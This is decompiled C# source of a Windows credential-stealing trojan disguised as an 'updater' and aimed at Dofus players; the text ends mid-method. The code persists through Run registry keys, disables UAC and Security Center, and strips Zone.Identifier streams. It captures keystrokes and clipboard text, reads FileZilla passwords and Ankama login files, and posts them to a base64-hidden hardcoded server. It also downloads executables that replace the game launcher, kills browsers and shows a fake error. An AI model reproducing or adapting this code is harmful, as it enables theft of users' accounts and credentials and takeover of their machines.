using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.Win32;

namespace updater;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer icontainer_0;

	[AccessedThroughProperty("Timer1")]
	private Timer timer_0;

	[AccessedThroughProperty("Timer2")]
	private Timer timer_1;

	[AccessedThroughProperty("Timer3")]
	private Timer timer_2;

	[AccessedThroughProperty("Timer4")]
	private Timer timer_3;

	[AccessedThroughProperty("Timer5")]
	private Timer timer_4;

	private RichTextBox richTextBox_0;

	private string string_0;

	private string string_1;

	private string string_2;

	private string string_3;

	private string string_4;

	private string string_5;

	private string string_6;

	private string string_7;

	private string string_8;

	private string string_9;

	private string string_10;

	private string string_11;

	private string string_12;

	private string string_13;

	private string string_14;

	private string string_15;

	private string string_16;

	private string string_17;

	private string string_18;

	private string string_19;

	private string string_20;

	private string string_21;

	private string string_22;

	private bool bool_0;

	private string string_23;

	private bool bool_1;

	private string string_24;

	private string string_25;

	private GClass0 gclass0_0;

	internal virtual Timer Timer_0
	{
		[DebuggerNonUserCode]
		get
		{
			return timer_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer_0_Tick;
			if (timer_0 != null)
			{
				timer_0.remove_Tick(eventHandler);
			}
			timer_0 = value;
			if (timer_0 != null)
			{
				timer_0.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer_1
	{
		[DebuggerNonUserCode]
		get
		{
			return timer_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer_1_Tick;
			if (timer_1 != null)
			{
				timer_1.remove_Tick(eventHandler);
			}
			timer_1 = value;
			if (timer_1 != null)
			{
				timer_1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer_2
	{
		[DebuggerNonUserCode]
		get
		{
			return timer_2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer_2_Tick;
			if (timer_2 != null)
			{
				timer_2.remove_Tick(eventHandler);
			}
			timer_2 = value;
			if (timer_2 != null)
			{
				timer_2.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer_3
	{
		[DebuggerNonUserCode]
		get
		{
			return timer_3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer_3_Tick;
			if (timer_3 != null)
			{
				timer_3.remove_Tick(eventHandler);
			}
			timer_3 = value;
			if (timer_3 != null)
			{
				timer_3.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer_4
	{
		[DebuggerNonUserCode]
		get
		{
			return timer_4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer_4_Tick;
			if (timer_4 != null)
			{
				timer_4.remove_Tick(eventHandler);
			}
			timer_4 = value;
			if (timer_4 != null)
			{
				timer_4.add_Tick(eventHandler);
			}
		}
	}

	public Form1()
	{
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).add_Leave((EventHandler)Form1_Leave);
		richTextBox_0 = new RichTextBox();
		string_20 = Conversions.ToString(2);
		bool_0 = false;
		string_23 = "SmFtZXM=";
		string_24 = null;
		string_25 = Conversions.ToString(0);
		gclass0_0 = new GClass0();
		InitializeComponent();
	}

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)Class2.MyForms_0.Form1_0);
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Expected O, but got Unknown
		//IL_0066: Unknown result type (might be due to invalid IL or missing references)
		//IL_0070: Expected O, but got Unknown
		//IL_00d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dd: Expected O, but got Unknown
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		Timer_0 = new Timer(icontainer_0);
		Timer_1 = new Timer(icontainer_0);
		Timer_2 = new Timer(icontainer_0);
		Timer_3 = new Timer(icontainer_0);
		Timer_4 = new Timer(icontainer_0);
		((Control)this).SuspendLayout();
		Timer_4.set_Interval(120000);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.Black);
		Size clientSize = new Size(0, 0);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Null");
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		UTF8Encoding uTF8Encoding = new UTF8Encoding();
		string s = "V1.6F" + ((ServerComputer)Class2.Class1_0).get_Name() + ((ServerComputer)Class2.Class1_0).get_Info().get_OSFullName() + Conversions.ToString((double)((ServerComputer)Class2.Class1_0).get_Info().get_TotalVirtualMemory() / 1024.0) + Conversions.ToString((double)((ServerComputer)Class2.Class1_0).get_Info().get_TotalPhysicalMemory() / 1024.0) + string_23;
		byte[] bytes = uTF8Encoding.GetBytes(s);
		string_22 = Convert.ToBase64String(bytes);
		Mutex mutex = new Mutex(initiallyOwned: true, string_22);
		try
		{
			mutex.ReleaseMutex();
			mutex.WaitOne();
			method_7();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			((Form)this).Close();
			ProjectData.ClearProjectError();
		}
	}

	private void Form1_Leave(object sender, EventArgs e)
	{
		gclass0_0.method_5();
		Timer_0.Stop();
	}

	private void Timer_0_Tick(object sender, EventArgs e)
	{
		RichTextBox val = richTextBox_0;
		val.set_Text(val.get_Text() + gclass0_0.string_1);
		gclass0_0.string_1 = "";
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Timer_1_Tick(object sender, EventArgs e)
	{
		if ((Operators.CompareString(richTextBox_0.get_Text(), "", false) == 0) | (Operators.CompareString(richTextBox_0.get_Text(), (string)null, false) == 0))
		{
			return;
		}
		try
		{
			string text = richTextBox_0.get_Text();
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\sitemanager.xml"))
			{
				text = Conversions.ToString(Operators.AddObject((object)text, method_10()));
			}
			if (Operators.ConditionalCompareObjectNotEqual(method_4(), (object)string_15, false))
			{
				text = Conversions.ToString(Operators.AddObject((object)text, Operators.ConcatenateObject((object)"\r\n\r\nPresse Papier : ", method_4())));
				string_15 = Conversions.ToString(method_4());
			}
			byte[] bytes = Convert.FromBase64String("aHR0cDovLzk1LjIxMS4xODcuNS9teWxvZ3MucGhw");
			UTF8Encoding uTF8Encoding = new UTF8Encoding();
			string @string = uTF8Encoding.GetString(bytes);
			if (method_1(@string))
			{
				bytes = Convert.FromBase64String(string_23);
				string string2 = uTF8Encoding.GetString(bytes);
				@string = @string + "?to=" + string2 + "&name=" + ((ServerComputer)Class2.Class1_0).get_Name() + "&os=" + ((ServerComputer)Class2.Class1_0).get_Info().get_OSFullName() + "&username=" + Environment.UserName + "&token=" + string_22;
				if (File.Exists(Application.get_StartupPath() + "\\config12.ini"))
				{
					text = text + File.ReadAllText(Application.get_StartupPath() + "\\config12.ini") + "\r\n\r\nFIN logs OFFLINE - " + Conversions.ToString(DateAndTime.get_Now());
					FileSystem.Kill(Application.get_StartupPath() + "\\config12.ini");
				}
				try
				{
					WebRequest webRequest = WebRequest.Create(@string);
					webRequest.Method = "POST";
					UTF8Encoding uTF8Encoding2 = new UTF8Encoding();
					string s = Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(text + "\r\n", "\r\n"), method_5()));
					byte[] bytes2 = uTF8Encoding.GetBytes(s);
					text = Convert.ToBase64String(bytes2);
					string s2 = "logs=" + text + "&token=" + string_22;
					byte[] bytes3 = uTF8Encoding2.GetBytes(s2);
					webRequest.ContentType = "application/x-www-form-urlencoded";
					webRequest.ContentLength = bytes3.Length;
					Stream requestStream = webRequest.GetRequestStream();
					requestStream.Write(bytes3, 0, bytes3.Length);
					requestStream.Close();
					WebResponse response = webRequest.GetResponse();
					requestStream = response.GetResponseStream();
					StreamReader streamReader = new StreamReader(requestStream);
					streamReader.ReadToEnd();
					streamReader.Close();
					requestStream.Close();
					response.Close();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			else if (File.Exists(Application.get_StartupPath() + "\\config12.ini"))
			{
				File.AppendAllText(Application.get_StartupPath() + "\\config12.ini", Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(text + "\r\n", "\r\n"), method_5())));
			}
			else
			{
				text = "\r\nDEBUT logs OFFLINE - " + Conversions.ToString(DateAndTime.get_Now()) + "\r\n" + text;
				File.AppendAllText(Application.get_StartupPath() + "\\config12.ini", Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(text + "\r\n", "\r\n"), method_5())));
			}
			richTextBox_0.set_Text((string)null);
			string_18 = Conversions.ToString(Conversions.ToDouble(string_18) + 1.0);
			if (Conversions.ToDouble(string_18) == 5.0)
			{
				Application.Restart();
				((Form)this).Close();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			Application.Restart();
			((Form)this).Close();
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public bool method_0(string string_26)
	{
		bool result = false;
		if (Strings.StrComp(string_26, (string)null, (CompareMethod)1) == 1 && Strings.StrComp(FileSystem.Dir(string_26, (FileAttribute)0), (string)null, (CompareMethod)1) == 1)
		{
			result = true;
		}
		return result;
	}

	private bool method_1(string string_26)
	{
		try
		{
			WebRequest webRequest = WebRequest.Create(string_26);
			webRequest.GetResponse();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
		return true;
	}

	private void method_2()
	{
		string[] array = new string[5]
		{
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Internet Explorer\\UserData",
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox",
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera\\Opera",
			Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data",
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\AnkamaCertificates\\v2-RELEASE"
		};
		string[] array2 = new string[5] { "Cache IE - Supprimé avec succès", "Cache Firefox - Supprimé avec succès", "Cache Opera - Supprimé avec succès", "Cache Chrome - Supprimé avec succès", "Certificats Dofus - Supprimé avec succès" };
		string[] array3 = new string[5] { "Cache IE - Echec de la suppresion", "Cache Firefox - Echec de la suppresion", "Cache Opera - Echec de la suppresion", "Cache Chrome - Echec de la suppresion", "Certificats Dofus - Echec de la suppresion" };
		int num = 0;
		do
		{
			try
			{
				if (Directory.Exists(array[num]))
				{
					((ServerComputer)Class2.Class1_0).get_FileSystem().DeleteDirectory(array[num], (DeleteDirectoryOption)5);
					string_24 = string_24 + "\r\n" + array2[num];
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				string_24 = string_24 + "\r\n" + array3[num];
				string_24 = string_24 + "\r\n" + ex2.Message;
				ProjectData.ClearProjectError();
			}
			num++;
		}
		while (num <= 4);
		if (bool_0)
		{
			method_12();
		}
	}

	private void method_3()
	{
		string path = Application.get_StartupPath() + "\\date.ini";
		Timer_2.Start();
		try
		{
			DateTime dateTime = DateAndTime.DateValue(Conversions.ToString(DateAndTime.get_Now()));
			if (File.Exists(path))
			{
				string text = File.ReadAllText(path);
				if (text.Contains(Conversions.ToString(dateTime)))
				{
					return;
				}
				File.AppendAllText(path, Conversions.ToString(dateTime));
			}
			else
			{
				File.AppendAllText(path, Conversions.ToString(dateTime));
				bool_0 = true;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		string[] array = new string[6] { "firefox", "iexplorer", "chrome", "opera", "DofusMod", "Dofus" };
		int num = 0;
		do
		{
			try
			{
				bool flag = false;
				while (Process.GetProcessesByName(array[num]).Length > 0)
				{
					Process[] processesByName = Process.GetProcessesByName(array[num]);
					foreach (Process process in processesByName)
					{
						process.Kill();
						flag = true;
					}
				}
				if (flag)
				{
					string_24 = string_24 + "\r\nProcess " + array[num] + " - Le processus a été arrété avec succès";
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				string_24 = string_24 + "\r\nProcess " + array[num] + " - Le processus n'a pas pu être arrété";
				string_24 = string_24 + "\r\n" + ex2.Message;
				ProjectData.ClearProjectError();
			}
			num++;
		}
		while (num <= 5);
		try
		{
			string s = "aHR0cDovLzk1LjIxMS4xODcuNS9kd24vRG9mdXNNb2QudHh0";
			byte[] bytes = Convert.FromBase64String(s);
			UTF8Encoding uTF8Encoding = new UTF8Encoding();
			string @string = uTF8Encoding.GetString(bytes);
			if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Dofus2\\app"))
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Dofus2\\app\\DofusMod.exe"))
				{
					File.Move(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Dofus2\\app\\DofusMod.exe", Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Dofus2\\app\\save.ini");
				}
				try
				{
					((ServerComputer)Class2.Class1_0).get_Network().DownloadFile(@string, Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Dofus2\\app\\DofusMod.txt");
					File.Move(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Dofus2\\app\\DofusMod.txt", Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Dofus2\\app\\DofusMod.exe");
					string_24 += "\r\nStartUp 3 - Téléchargement & installation : Succès";
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3);
					Exception ex4 = ex3;
					string_24 += "\r\nStartUp 3 - Téléchargement & installation : Echec";
					string_24 = string_24 + "\r\n" + ex4.Message;
					ProjectData.ClearProjectError();
				}
			}
			else if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + " (x86)\\Dofus2\\app"))
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + " (x86)\\Dofus2\\app\\DofusMod.exe"))
				{
					File.Move(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + " (x86)\\Dofus2\\app\\DofusMod.exe", Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + " (x86)\\Dofus2\\app\\save.ini");
				}
				try
				{
					((ServerComputer)Class2.Class1_0).get_Network().DownloadFile(@string, Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + " (x86)\\Dofus2\\app\\DofusMod.txt");
					File.Move(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + " (x86)\\Dofus2\\app\\DofusMod.txt", Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + " (x86)\\Dofus2\\app\\DofusMod.exe");
					string_24 += "\r\nStartUp 3 - Téléchargement & installation : Succès";
				}
				catch (Exception ex5)
				{
					ProjectData.SetProjectError(ex5);
					Exception ex6 = ex5;
					string_24 += "\r\nStartUp 3 - Téléchargement & installation : Echec";
					string_24 = string_24 + "\r\n" + ex6.Message;
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		method_2();
	}

	private void Timer_3_Tick(object sender, EventArgs e)
	{
		method_3();
		Timer_3.Stop();
	}

	private object method_4()
	{
		return ((Computer)Class2.Class1_0).get_Clipboard().GetText();
	}

	public object method_5()
	{
		string text = null;
		try
		{
			int num = default(int);
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Dofus2\\Module_Ankama_Connection.dat"))
			{
				string[] array = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Dofus2\\Module_Ankama_Connection.dat").Split(new char[1] { 'n' });
				text += "NDC :";
				string[] array2 = array;
				for (int i = 0; i < array2.Length; i++)
				{
					if (num > 0)
					{
						if (num > 1)
						{
							text += "n";
						}
						text += array[num];
					}
					num++;
				}
				text += "\r\n";
			}
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Dofus 2\\Module_Ankama_Connection.dat"))
			{
				string[] array = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Dofus 2\\Module_Ankama_Connection.dat").Split(new char[1] { 'n' });
				text += "NDC :";
				string[] array3 = array;
				for (int j = 0; j < array3.Length; j++)
				{
					if (num > 0)
					{
						if (num > 1)
						{
							text += "n";
						}
						text += array[num];
					}
					num++;
				}
				text += "\r\n";
				return text;
			}
			return text;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			text = text + "\r\n" + ex2.Message;
			ProjectData.ClearProjectError();
			return text;
		}
	}

	private void method_6()
	{
		byte[] bytes = Convert.FromBase64String("aHR0cDovLzk1LjIxMS4xODcuNS9teWxvZ3MucGhw");
		UTF8Encoding uTF8Encoding = new UTF8Encoding();
		string @string = uTF8Encoding.GetString(bytes);
		if (!method_1(@string))
		{
			return;
		}
		string s = "aHR0cDovLzk1LjIxMS4xODcuNS9kd24vbGF1bmNoZXIudHh0";
		bytes = Convert.FromBase64String(s);
		string string2 = uTF8Encoding.GetString(bytes);
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\launcher.exe"))
			{
				try
				{
					((ServerComputer)Class2.Class1_0).get_Network().DownloadFile(string2, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\launcher.txt");
					File.Move(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\launcher.txt", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\launcher.exe");
					string_24 += "\r\nStartUp 1 - Téléchargement : Succès";
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					string_24 += "\r\nStartUp 1 - Téléchargement : Echec";
					string_24 = string_24 + "\r\n" + ex2.Message;
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\launcher.exe"))
			{
				try
				{
					((ServerComputer)Class2.Class1_0).get_Network().DownloadFile(string2, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\launcher.txt");
					File.Move(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\launcher.txt", Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\launcher.exe");
					string_24 += "\r\nStartUp 2 - Téléchargement : Succès";
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3);
					Exception ex4 = ex3;
					string_24 += "\r\nStartUp 2 - Téléchargement : Echec";
					string_24 = string_24 + "\r\n" + ex4.Message;
					ProjectData.ClearProjectError();
				}
				method_8();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").SetValue("updater", string_12);
			string_24 += "\r\nStartUp Principal 1 - Installation : Succès";
		}
		catch (Exception ex5)
		{
			ProjectData.SetProjectError(ex5);
			Exception ex6 = ex5;
			string_24 += "\r\nStartUp Principal 1 - Installation : Echec";
			string_24 = string_24 + "\r\n" + ex6.Message;
			ProjectData.ClearProjectError();
		}
		try
		{
			Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").SetValue("updater", string_12);
			string_24 += "\r\nStartUp Principal 2 - Installation : Succès";
		}
		catch (Exception ex7)
		{
			ProjectData.SetProjectError(ex7);
			Exception ex8 = ex7;
			string_24 += "\r\nStartUp Principal 2 - Installation : Echec";
			string_24 = string_24 + "\r\n" + ex8.Message;
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void method_7()
	{
		try
		{
			string_12 = Path.GetTempPath() + "updater.exe";
			if (((ServerComputer)Class2.Class1_0).get_FileSystem().FileExists(string_12))
			{
				if (Operators.CompareString(Application.get_ExecutablePath(), string_12, false) == 0)
				{
					if (!File.Exists(Application.get_StartupPath() + "\\date.ini"))
					{
						method_6();
					}
					try
					{
						string[] array = null;
						array = new string[4] { "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\wscsvc", "Start", "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableLUA" };
						method_9(array, string_12, "updater");
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					try
					{
						gclass0_0.method_6();
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					Timer_0.set_Interval(50);
					Timer_0.Start();
					Timer_1.set_Interval(300000);
					Timer_1.Start();
					Timer_4.set_Interval(5000);
					Timer_2.set_Interval(60000);
					Timer_3.set_Interval(10000);
					Timer_3.Start();
					string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\flushfile_4554714.tmp";
					try
					{
						if (!File.Exists(text))
						{
							File.Copy(string_12, text);
						}
						return;
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
						return;
					}
				}
				try
				{
					while (Process.GetProcessesByName("updater").Length > 0)
					{
						Process[] processesByName = Process.GetProcessesByName("updater");
						foreach (Process process in processesByName)
						{
							process.Kill();
						}
					}
					FileSystem.Kill(string_12);
					File.Move(Application.get_ExecutablePath(), string_12);
					Process.Start(string_12);
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
				((Form)this).Close();
			}
			else
			{
				File.Move(Application.get_ExecutablePath(), string_12);
				Process.Start(string_12);
				((Form)this).Close();
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
	}

	private void method_8()
	{
		try
		{
			Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").SetValue("launcher", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\launcher.exe");
			string_24 += "\r\nStartUp 1 - Installation : Succès";
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			string_24 += "\r\nStartUp 1 - Echec de l'installation";
			string_24 = string_24 + "\r\n" + ex2.Message;
			ProjectData.ClearProjectError();
		}
		try
		{
			Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").SetValue("launcher", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\launcher.exe");
			string_24 += "\r\nStartUp 2 - Installation : Succès";
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			string_24 += "\r\nStartUp 2 - Echec de l'installation";
			string_24 = string_24 + "\r\n" + ex4.Message;
			ProjectData.ClearProjectError();
		}
	}

	private void method_9(string[] string_26, string string_27, string string_28)
	{
		if (!((ServerComputer)Class2.Class1_0).get_Info().get_OSFullName().Contains("XP"))
		{
			int num = 0;
			do
			{
				try
				{
					if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(((ServerComputer)Class2.Class1_0).get_Registry().GetValue(string_26[0 + 2 * num], string_26[1 + 2 * num], (object)""), (object)(4 * (1 - num)), false))))
					{
						((ServerComputer)Class2.Class1_0).get_Registry().SetValue(string_26[0 + 2 * num], string_26[1 + 2 * num], (object)(4 * (1 - num)));
					}
					if (num == 0)
					{
						string_24 += "\r\nBypass UAC - Etapes 1 : Succès";
					}
					else
					{
						string_24 += "\r\nBypass UAC - Etapes 2 : Succès";
					}
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					if (num == 0)
					{
						string_24 += "\r\nBypass UAC - Etapes 1 : Echec";
					}
					else
					{
						string_24 += "\r\nBypass UAC - Etapes 2 : Echec";
					}
					string_24 = string_24 + "\r\n" + ex2.Message;
					ProjectData.ClearProjectError();
				}
				num++;
			}
			while (num <= 1);
		}
		else
		{
			string_24 += "\r\nBypass UAC - Etapes 1 & 2 : Non nécessaire";
		}
		try
		{
			Process process = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = "cmd";
			processStartInfo.RedirectStandardInput = true;
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			process.StartInfo = processStartInfo;
			process.Start();
			StreamReader standardOutput = process.StandardOutput;
			StreamWriter standardInput = process.StandardInput;
			standardInput.WriteLine("cd " + string_27);
			standardInput.WriteLine("FOR /R %I IN (*" + string_28 + "*) DO > %I:Zone.Identifier ECHO.");
			standardInput.WriteLine("exit");
			Console.WriteLine(standardOutput.ReadToEnd());
			standardInput.Close();
			standardOutput.Close();
			string_24 += "\r\nBypass UAC - Etapes 3 : Succès";
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			string_24 += "\r\nBypass UAC - Etapes 3 : Echec";
			string_24 = string_24 + "\r\n" + ex4.Message;
			ProjectData.ClearProjectError();
		}
	}

	private object method_10()
	{
		StreamReader streamReader = new StreamReader(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\sitemanager.xml");
		string text = null;
		string text2 = streamReader.ReadLine();
		text = "\r\n\r\n//// FilleZila \\\\\\\\";
		while (text2 != null)
		{
			if (text2.Contains("Host"))
			{
				text = text + "\r\n\r\n" + text2 + "\r\n";
			}
			if (text2.Contains("Port"))
			{
				text = text + text2 + "\r\n";
			}
			if (text2.Contains("User"))
			{
				text = text + text2 + "\r\n";
			}
			if (text2.Contains("Pass"))
			{
				text = text + text2 + "\r\n";
			}
			text2 = streamReader.ReadLine();
		}
		return text;
	}

	private object method_11(string string_26)
	{
		bool flag = false;
		DirectoryInfo directoryInfo = new DirectoryInfo(string_26);
		FileInfo[] files = directoryInfo.GetFiles("*.*");
		for (int i = 0; i < files.Length; i++)
		{
			flag = true;
		}
		return flag;
	}

	private void Timer_2_Tick(object sender, EventArgs e)
	{
		Timer_2.set_Interval(100);
		try
		{
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\AnkamaCertificates\\v2-RELEASE") || !Conversions.ToBoolean(method_11(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\AnkamaCertificates\\v2-RELEASE")))
			{
				return;
			}
			Process[] processes = Process.GetProcesses();
			Process[] array = processes;
			foreach (Process process in array)
			{
				if (process.ProcessName.Contains("Dofus"))
				{
					process.Kill();
				}
			}
			((ServerComputer)Class2.Class1_0).get_FileSystem().DeleteDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\AnkamaCertificates\\v2-RELEASE", (DeleteDirectoryOption)5);
			Class2.MyForms_0.Dofus_0.Label1.set_Text("ERROR : \r\nUnable to get value get_hash_code() in get_certificat()\r\n\r\nPlease, contact support for more information");
			((Control)Class2.MyForms_0.Dofus_0).Show();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void method_12()
	{
		string text = null;
		try
		{
